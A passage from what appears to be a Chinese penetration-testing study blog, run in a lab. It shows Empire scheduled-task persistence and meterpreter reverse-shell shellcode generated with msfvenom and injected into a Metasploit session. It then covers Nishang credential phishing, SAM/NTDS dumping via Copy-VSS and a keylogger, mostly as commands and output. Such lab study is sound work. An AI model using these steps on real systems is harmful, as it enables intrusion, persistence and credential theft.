</span></span><span class="line"><span class="cl">│                  │                                     │          │ is True. For powershell only.       │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ OnLogon          │                                     │ False    │ Switch. Trigger script on user      │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ logon.                              │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Proxy            │ default                             │ False    │ Proxy to use <span class="k">for</span> request <span class="o">(</span>default,  │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ none, or other<span class="o">)</span>.                    │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ ProxyCreds       │ default                             │ False    │ Proxy credentials                   │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ <span class="o">([</span>domain<span class="se">\]</span>username:password<span class="o">)</span> to use │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ <span class="k">for</span> request <span class="o">(</span>default, none, or      │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ other<span class="o">)</span>.                             │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ RegPath          │ HKLM:<span class="se">\S</span>oftware<span class="se">\M</span>icrosoft<span class="se">\N</span>etwork<span class="se">\d</span>e │ False    │ Registry location to store the      │
</span></span><span class="line"><span class="cl">│                  │ bug                                 │          │ script code. Last element is the    │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ key name.                           │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ TaskName         │ Updater                             │ True     │ Name to use <span class="k">for</span> the schtask.        │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ UserAgent        │ default                             │ False    │ User-agent string to use <span class="k">for</span> the    │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ staging request <span class="o">(</span>default, none, or  │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ other<span class="o">)</span>.                             │
</span></span><span class="line"><span class="cl">└──────────────────┴─────────────────────────────────────┴──────────┴─────────────────────────────────────┘
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: usemodule/powershell/persistence/elevated/schtasks<span class="o">)</span> &gt; <span class="nb">set</span> DailyTime 14:26
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: usemodule/powershell/persistence/elevated/schtasks<span class="o">)</span> &gt; <span class="nb">set</span> Listener <span class="nb">test</span>
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: usemodule/powershell/persistence/elevated/schtasks<span class="o">)</span> &gt; execute
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Tasked 45WYG2ZB to run Task <span class="m">1</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Task <span class="m">1</span> results received
</span></span><span class="line"><span class="cl">SUCCESS: The scheduled task <span class="s2">&#34;Updater&#34;</span> has successfully been created.
</span></span><span class="line"><span class="cl">Schtasks persistence established using listener <span class="nb">test</span> stored in HKLM:<span class="se">\S</span>oftware<span class="se">\M</span>icrosoft<span class="se">\N</span>etwork<span class="se">\d</span>ebug with Updater daily trigger at 14:26.
</span></span></code></pre></div><p>等待指定时间就会执行这计划任务反弹shell回来。</p>
<h3 id="与metasploit联动">与Metasploit联动</h3>
<p>跟MSF和CS联动差不多，也可以把Empire的shell反弹到MSF中，下面演示使用,我们先在msf中设置一下信息：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 &gt; use exploit/multi/handler 
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Using configured payload windows/x64/meterpreter/reverse_https
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; show options
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Module options <span class="o">(</span>exploit/multi/handler<span class="o">)</span>:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Name  Current Setting  Required  Description
</span></span><span class="line"><span class="cl">   ----  ---------------  --------  -----------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Payload options <span class="o">(</span>windows/x64/meterpreter/reverse_https<span class="o">)</span>:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Name      Current Setting  Required  Description
</span></span><span class="line"><span class="cl">   ----      ---------------  --------  -----------
</span></span><span class="line"><span class="cl">   EXITFUNC  process          yes       Exit technique <span class="o">(</span>Accepted: <span class="s1">&#39;&#39;</span>, seh, thread, process, none<span class="o">)</span>
</span></span><span class="line"><span class="cl">   LHOST     172.16.0.107     yes       The <span class="nb">local</span> listener hostname
</span></span><span class="line"><span class="cl">   LPORT     <span class="m">4444</span>             yes       The <span class="nb">local</span> listener port
</span></span><span class="line"><span class="cl">   LURI                       no        The HTTP Path
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Exploit target:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Id  Name
</span></span><span class="line"><span class="cl">   --  ----
</span></span><span class="line"><span class="cl">   <span class="m">0</span>   Wildcard Target
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; exploit 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Started HTTPS reverse handler on https://172.16.0.107:4444
</span></span></code></pre></div><p>然后使用Empire中的模块：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>Empire: CUE6G5YS<span class="o">)</span> &gt; usemodule powershell/code_execution/invoke_shellcode
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Set Agent to CUE6G5YS
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> Author       @mattifestation                                                        
</span></span><span class="line"><span class="cl"> Background   True                                                                   
</span></span><span class="line"><span class="cl"> Comments     http://www.exploit-monday.com                                          
</span></span><span class="line"><span class="cl">              https://github.com/mattifestation/PowerSploit/blob/master/CodeExecutio 
</span></span><span class="line"><span class="cl">              n/Invoke-Shellcode.ps1                                                 
</span></span><span class="line"><span class="cl"> Description  Uses PowerSploit<span class="s1">&#39;s Invoke--Shellcode to inject shellcode into the      
</span></span></span><span class="line"><span class="cl"><span class="s1">              process ID of your choosing or within the context of the running       
</span></span></span><span class="line"><span class="cl"><span class="s1">              PowerShell process. If you&#39;</span>re injecting custom shellcode, make sure    
</span></span><span class="line"><span class="cl">              it<span class="s1">&#39;s in the correct format and matches the architecture of the process 
</span></span></span><span class="line"><span class="cl"><span class="s1">              you&#39;</span>re injecting into.                                                 
</span></span><span class="line"><span class="cl"> Language     powershell                                                             
</span></span><span class="line"><span class="cl"> Name         powershell/code_execution/invoke_shellcode                             
</span></span><span class="line"><span class="cl"> NeedsAdmin   False                                                                  
</span></span><span class="line"><span class="cl"> OpsecSafe    True                                                                   
</span></span><span class="line"><span class="cl"> Software     http://attack.mitre.org/software/S0194                                 
</span></span><span class="line"><span class="cl"> Techniques   http://attack.mitre.org/techniques/T1064                               
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">┌Record Options────────────┬──────────┬────────────────────────────────────┐
</span></span><span class="line"><span class="cl">│ Name      │ Value        │ Required │ Description                        │
</span></span><span class="line"><span class="cl">├───────────┼──────────────┼──────────┼────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Agent     │ CUE6G5YS     │ True     │ Agent to run module on.            │
</span></span><span class="line"><span class="cl">├───────────┼──────────────┼──────────┼────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ File      │              │ False    │ Binary file from the server to     │
</span></span><span class="line"><span class="cl">│           │              │          │ execute on the agent.              │
</span></span><span class="line"><span class="cl">├───────────┼──────────────┼──────────┼────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Lhost     │ 172.16.0.107 │ False    │ Local host handler <span class="k">for</span> the         │
</span></span><span class="line"><span class="cl">│           │              │          │ meterpreter shell.                 │
</span></span><span class="line"><span class="cl">├───────────┼──────────────┼──────────┼────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Listener  │              │ False    │ Meterpreter/Beacon listener name.  │
</span></span><span class="line"><span class="cl">├───────────┼──────────────┼──────────┼────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Lport     │ <span class="m">4444</span>         │ False    │ Local port of the host handler.    │
</span></span><span class="line"><span class="cl">├───────────┼──────────────┼──────────┼────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ ProcessID │              │ False    │ Process ID of the process you want │
</span></span><span class="line"><span class="cl">│           │              │          │ to inject shellcode into.          │
</span></span><span class="line"><span class="cl">├───────────┼──────────────┼──────────┼────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Shellcode │              │ False    │ Custom shellcode to inject,        │
</span></span><span class="line"><span class="cl">│           │              │          │ 0xaa,0xab,... format.              │
</span></span><span class="line"><span class="cl">└───────────┴──────────────┴──────────┴────────────────────────────────────┘
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: usemodule/powershell/code_execution/invoke_shellcode<span class="o">)</span> &gt; execute
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Tasked CUE6G5YS to run Task <span class="m">6</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Task <span class="m">6</span> results received
</span></span><span class="line"><span class="cl">Job started: RT9M1D
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Task <span class="m">6</span> results received
</span></span><span class="line"><span class="cl">Shellcode injected.
</span></span></code></pre></div><p>这里测试失败。。。也去查看了的源码：</p>
<p><a href="https://raw.githubusercontent.com/BC-SECURITY/Empire/6d8169a8ea818f9af478e173a9a548c626c80d05/empire/server/data/module_source/code_execution/Invoke-Shellcode.ps1">https://raw.githubusercontent.com/BC-SECURITY/Empire/6d8169a8ea818f9af478e173a9a548c626c80d05/empire/server/data/module_source/code_execution/Invoke-Shellcode.ps1</a></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    -------------------------- EXAMPLE 3 --------------------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    C:\PS&gt;Start-Process C:\Windows\SysWOW64\notepad.exe -WindowStyle Hidden
</span></span><span class="line"><span class="cl">    C:\PS&gt; $Proc = Get-Process notepad
</span></span><span class="line"><span class="cl">    C:\PS&gt; Invoke-Shellcode -ProcessId $Proc.Id -Payload
</span></span><span class="line"><span class="cl">    windows/meterpreter/reverse_https -Lhost 192.168.30.129 -Lport 443 -Verbose
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    -------------------------- EXAMPLE 5 --------------------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    C:\PS&gt;Invoke-Shellcode -Shellcode @(0x90,0x90,0xC3)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Description
</span></span><span class="line"><span class="cl">    -----------
</span></span><span class="line"><span class="cl">    Overrides the shellcode included in the script with custom shellcode -
</span></span><span class="line"><span class="cl">    0x90 (NOP), 0x90 (NOP), 0xC3 (RET)
</span></span><span class="line"><span class="cl">    Warning: This script has no way to validate that your shellcode is 32 vs.
</span></span><span class="line"><span class="cl">    64-bit!
</span></span></code></pre></div><p>感觉跟书中不一样，设置了<code>Lhost</code>和<code>Lport</code>还有个payload呢，但是empire里面只有个Listener，这个设置也不对。去查看empire的源码<code>/usr/share/powershell-empire/empire/server/modules/powershell/code_execution/invoke_shellcode.py</code>，调试了才知道，只是设置上面的地址和端口就是执行下面的内容：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Invoke-Shellcode -Force -Lhost 172.16.0.107 -Lport 4444<span class="p">;</span> <span class="s1">&#39;Shellcode injected.&#39;</span>
</span></span></code></pre></div><p>所以这里我们可以用我们在<code>PowerSploit</code>一节当中的方法去利用，我们先生成一个shellcode：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>oscp㉿oscp<span class="o">)</span>-<span class="o">[</span>~/<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ msfvenom -p windows/x64/meterpreter/reverse_https <span class="nv">LHOST</span><span class="o">=</span>172.16.0.107 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f powershell -o /home/kali/test
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x64 from the payload
</span></span><span class="line"><span class="cl">No encoder specified, outputting raw payload
</span></span><span class="line"><span class="cl">Payload size: <span class="m">645</span> bytes
</span></span><span class="line"><span class="cl">Final size of powershell file: <span class="m">3150</span> bytes
</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>oscp㉿oscp<span class="o">)</span>-<span class="o">[</span>~/<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ cat <span class="nb">test</span>
</span></span><span class="line"><span class="cl">Byte<span class="o">[]]</span> <span class="nv">$buf</span> <span class="o">=</span> 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0...
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x0,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5
</span></span></code></pre></div><p>我们复制等号=后面的内容即可,然后回到我们的empire中的模块执行：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>Empire: usemodule/powershell/code_execution/invoke_shellcode<span class="o">)</span> &gt; <span class="nb">unset</span> Lhost
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Unset Lhost
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: usemodule/powershell/code_execution/invoke_shellcode<span class="o">)</span> &gt; <span class="nb">unset</span> Lport
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Unset Lport
</span></span><span class="line"><span class="cl"><span class="nb">set</span> Shellcode 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x51,0x56,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">,0x31,0xc0,0xac,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x3,0x4c,0x24,0xff,0xd5
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: usemodule/powershell/code_execution/invoke_shellcode<span class="o">)</span> &gt; execute
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Tasked XTLRN9FW to run Task <span class="m">4</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Task <span class="m">4</span> results received
</span></span><span class="line"><span class="cl">Job started: V6S9DL
</span></span></code></pre></div><p>这里我们的MSF中就反弹回来一个shell了：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; run
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Started HTTPS reverse handler on https://172.16.0.107:4444
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> https://172.16.0.107:4444 handling request from 172.16.0.106<span class="p">;</span> <span class="o">(</span>UUID: j1druwho<span class="o">)</span> Without a database connected that payload UUID tracking will not work!
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> https://172.16.0.107:4444 handling request from 172.16.0.106<span class="p">;</span> <span class="o">(</span>UUID: j1druwho<span class="o">)</span> Staging x64 payload <span class="o">(</span><span class="m">201308</span> bytes<span class="o">)</span> ...
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> https://172.16.0.107:4444 handling request from 172.16.0.106<span class="p">;</span> <span class="o">(</span>UUID: j1druwho<span class="o">)</span> Without a database connected that payload UUID tracking will not work!
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Meterpreter session <span class="m">13</span> opened <span class="o">(</span>172.16.0.107:4444 -&gt; 127.0.0.1 <span class="o">)</span> at 2022-01-23 00:51:04 +0800
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">meterpreter &gt; 
</span></span></code></pre></div><p>本来想放弃了，但是又忍不住去弄，结果不小心就成功了～，做技术还是不要那么浮躁才好。</p>
<h1 id="nishang">Nishang</h1>
<p><code>Nishang</code>是一个基于<code>PowerShell</code>攻击脚本和有效载荷的框架和集合，支持使用<code>PowerShell</code>进行攻击性安全、渗透测试和红队合作，集成了框架、脚本和各种payload（包括下载、执行、后门、扫描、执行、解密、键盘记录等脚本），被广泛用于渗透测试的各个阶段。</p>
<h2 id="安装-2">安装</h2>
<p>下载链接：https://github.com/samratashok/nishang</p>
<p>可以使用git下载到目标机器上：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/samratashok/nishang.git
</span></span></code></pre></div><p>也可以直接下载zip包，然后在目标机器上解压即可。</p>
<p>测试的环境最好是在Windows 7以上，因为Nishang是支持powershell 3.0以上的版本，所以最好是在Windows 10或者是Windows 2012 以上的系统。</p>
<p>打开Powershell，输入一下命令即可导入模块：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Import-Module .\nishang.psm1
</span></span></code></pre></div><blockquote>
<p>如果系统禁止执行可以先设置命令 Set-ExecutionPolicy UnRestricted</p>
</blockquote>
<p>我们来看下Nishang模块的目录介绍：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ActiveDirectory：活动目录
</span></span><span class="line"><span class="cl">Antak-WebShell：在内存中执行PowerShell脚本，运行命令，并使用此Webshell下载和上载文件。
</span></span><span class="line"><span class="cl">Backdoors：一个后门，可以从第三方网站接收指令，并在内存中执行PowerShell脚本。
</span></span><span class="line"><span class="cl">Bypass：实施公共已知方法来绕过
</span></span><span class="line"><span class="cl">Client：客户端
</span></span><span class="line"><span class="cl">Escalation：当需要权限时提权
</span></span><span class="line"><span class="cl">Execution：命令执行(RCE)
</span></span><span class="line"><span class="cl">Gather：信息收集
</span></span><span class="line"><span class="cl">MITM：用于MITM攻击的本地HTTPS代理
</span></span><span class="line"><span class="cl">Misc：脚本
</span></span><span class="line"><span class="cl">Pivot：跳板、远程执行exe
</span></span><span class="line"><span class="cl">Prasadhak：对照VirusTotal数据库检查正在运行的进程的运行哈希。
</span></span><span class="line"><span class="cl">Scan：扫描
</span></span><span class="line"><span class="cl">Shells：shell
</span></span><span class="line"><span class="cl">Utility：杂项
</span></span><span class="line"><span class="cl">Powerpreter：Meterpreter会话
</span></span></code></pre></div><h2 id="nishang模块攻击实战">Nishang模块攻击实战</h2>
<h3 id="check-vm">Check-VM</h3>
<p>我们只要执行以下命令即可知道本机是否是虚拟机：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">test</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">&gt;</span> <span class="nb">Check-VM</span>
</span></span><span class="line"><span class="cl"><span class="n">This</span> <span class="n">is</span> <span class="n">a</span> <span class="nb">Hyper-V</span> <span class="n">machine</span><span class="p">.</span>
</span></span><span class="line"><span class="cl"><span class="n">This</span> <span class="n">is</span> <span class="n">a</span> <span class="n">VMWare</span> <span class="n">machine</span><span class="p">.</span>
</span></span></code></pre></div><h3 id="invoke-credentialsphish">Invoke-CredentialsPhish</h3>
<p>这个脚本是用来欺骗目标主机的用户，让用户输入密码，如果不输入正确的密码就不回关闭对话框：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">test</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">&gt;</span> <span class="nb">Invoke-CredentialsPhish</span>
</span></span><span class="line"><span class="cl"><span class="n">Username</span><span class="err">:</span> <span class="n">testuser</span> <span class="n">Password</span><span class="err">:</span> <span class="n">p</span><span class="nv">@ssw0rd</span> <span class="n">Domain</span><span class="err">:</span> <span class="n">Domain</span><span class="err">:</span><span class="n">hack</span>
</span></span></code></pre></div><h3 id="copy-vss">Copy-VSS</h3>
<p>就是copy凭证的功能，需要有管理员权限，相关的知识可以看下面链接：</p>
<p><a href="https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets">https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets</a></p>
<p><a href="https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds">https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds</a></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">test</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">&gt;</span> <span class="nb">Copy-VSS</span>
</span></span><span class="line"><span class="cl"><span class="n">已复制</span>         <span class="mf">1</span> <span class="n">个文件</span><span class="err">。</span>
</span></span><span class="line"><span class="cl"><span class="n">已复制</span>         <span class="mf">1</span> <span class="n">个文件</span><span class="err">。</span>
</span></span><span class="line"><span class="cl"><span class="n">已复制</span>         <span class="mf">1</span> <span class="n">个文件</span><span class="err">。</span>
</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">test</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">&gt;</span> <span class="nb">dir
</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">-a</span><span class="p">----</span>        <span class="mf">2022</span><span class="p">/</span><span class="mf">1</span><span class="p">/</span><span class="mf">18</span>     <span class="mf">17</span><span class="err">:</span><span class="mf">39</span>       <span class="mf">12582912</span> <span class="n">ntds</span>
</span></span><span class="line"><span class="cl"><span class="n">-a</span><span class="p">----</span>        <span class="mf">2016</span><span class="p">/</span><span class="mf">7</span><span class="p">/</span><span class="mf">16</span>     <span class="mf">21</span><span class="err">:</span><span class="mf">25</span>          <span class="mf">65536</span> <span class="n">SAM</span>
</span></span><span class="line"><span class="cl"><span class="n">-a</span><span class="p">----</span>        <span class="mf">2022</span><span class="p">/</span><span class="mf">1</span><span class="p">/</span><span class="mf">18</span>     <span class="mf">17</span><span class="err">:</span><span class="mf">52</span>       <span class="mf">16252928</span> <span class="n">SYSTEM</span>
</span></span></code></pre></div><h3 id="firebuster-firelistener扫描器">FireBuster FireListener扫描器</h3>
<p>感觉就是一个端口扫描，用处不是很大，就是一直监听这端口是否开放：</p>
<p>攻击机：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PS C:\Users\test\Desktop\nishang-master&gt; FireListener 3389-3390
</span></span><span class="line"><span class="cl">Listening on port 3389
</span></span><span class="line"><span class="cl">Listening on port 3390
</span></span><span class="line"><span class="cl">Listening on port 3389
</span></span><span class="line"><span class="cl">Listening on port 3389
</span></span><span class="line"><span class="cl">172.16.0.106 connected through port 3390
</span></span><span class="line"><span class="cl">Listening on port 3390
</span></span><span class="line"><span class="cl">Listening on port 3389
</span></span></code></pre></div><p>目标主机：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PS C:\Users\test\Desktop\nishang-master\nishang-master&gt; FireBuster 172.16.0.106 3389-3390 -Verbose
</span></span><span class="line"><span class="cl">详细信息: Trying to connect to 172.16.0.106 from 3389 to 3390
</span></span><span class="line"><span class="cl">Sending....
</span></span><span class="line"><span class="cl">详细信息: Trying port 3389
</span></span><span class="line"><span class="cl">Connected to port 3389
</span></span><span class="line"><span class="cl">详细信息: Trying port 3390
</span></span><span class="line"><span class="cl">Connected to port 3390
</span></span><span class="line"><span class="cl">Data sent to all ports
</span></span></code></pre></div><p>可以看到3389就目标主机开放的，但是按书里来的话3390是被判定是开放的。。。</p>
<h3 id="keylogger键盘记录">Keylogger键盘记录</h3>
<p>这个键盘记录具有自定义web来控制的功能，我们先来直接导入keylog文件看看,提示输入就按空格即可：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PS C:\Users\test\Desktop\nishang-master\nishang-master&gt; .\Gather\Keylogger.ps1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">位于命令管道位置 1 的 cmdlet Keylogger.ps1
</span></span><span class="line"><span class="cl">请为以下参数提供值:
</span></span><span class="line"><span class="cl">CheckURL:
</span></span><span class="line"><span class="cl">MagicString:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Id     Name            PSJobTypeName   State         HasMoreData     Location             Command
</span></span><span class="line"><span class="cl">--     ----            -------------   -----         -----------     --------             -------
</span></span><span class="line"><span class="cl">1      Job1            BackgroundJob   Running       True            localhost            Keylogger $args[0] $ar...
</span></span></code></pre></div><p>执行完会保存在当前用户的Temp目录下：</p>
<p><code>C:\Users\test\AppData\Local\Temp\3\key.log</code></p>
<p>查看到内容大概是一些这种字符：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1 
</span></span><span class="line"><span class="cl">S-83 
</span></span><span class="line"><span class="cl">S-65 
</span></span><span class="line"><span class="cl">S-70 
</span></span><span class="line"><span class="cl">S-71 
</span></span><span class="line"><span class="cl">S-67 
</span></span><span class="line"><span class="cl">S-86 
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">S-67 
</span></span><span class="line"><span class="cl">S-88 
</span></span><span class="line"><span class="cl">1 
</span></span><span class="line"><span class="cl">1 
</span></span><span class="line"><span class="cl">S-77 
</span></span><span class="line"><span class="cl">S-77 
</span></span></code></pre></div><p>我们还需要对该文件进行解析才能看到完整的内容：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">test</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">&gt;</span> <span class="p">.\</span><span class="n">Utility</span><span class="p">\</span><span class="n">Parse_Keys</span><span class="p">.</span><span class="py">ps1</span>
</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">test</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">\</span><span class="nb">nishang-master</span><span class="p">&gt;</span> <span class="n">Parse_Keys</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">test</span><span class="p">\</span><span class="n">AppData</span><span class="p">\</span><span class="n">Local</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="mf">3</span><span class="p">\</span><span class="n">key</span><span class="p">.</span><span class="py">log</span> <span class="n">para</span><span class="p">.</span><span class="py">txt</span>
</span></span></code></pre></div><p>查看para.txt文件就是记录的实际内容了：</p>
